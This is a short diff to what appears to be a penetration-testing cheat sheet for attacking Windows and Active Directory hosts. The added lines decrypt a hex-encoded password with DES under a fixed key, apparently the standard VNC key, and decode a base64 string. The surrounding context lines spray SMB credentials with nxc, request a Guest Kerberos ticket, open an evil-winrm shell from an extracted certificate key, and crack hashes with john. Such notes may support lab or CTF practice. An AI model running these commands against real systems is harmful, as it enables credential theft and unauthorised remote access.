@@ -130,6 +130,10 @@ sudo systemctl start openntpd; sudo ntpdate -b $TARGET; sudo hwclock --systohc; 
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 
 # Exploitation
+## Decoding
+echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
+echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
+
 ## Spray Services
 (
 (nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
@@ -541,6 +545,10 @@ openssl pkcs12 -in auth.pfx -nocerts -out auth.key-enc
 openssl rsa -in auth.key-enc -out auth.key
 openssl pkcs12 -in auth.pfx -clcerts -nokeys -out auth.crt
 evil-winrm -i $TARGET -S -k auth.key -c auth.crt
+
++---------- HEX ----------+
+echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
+echo -n '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
 
 +---------- John ----------+
 john hashes -w=$rockyou
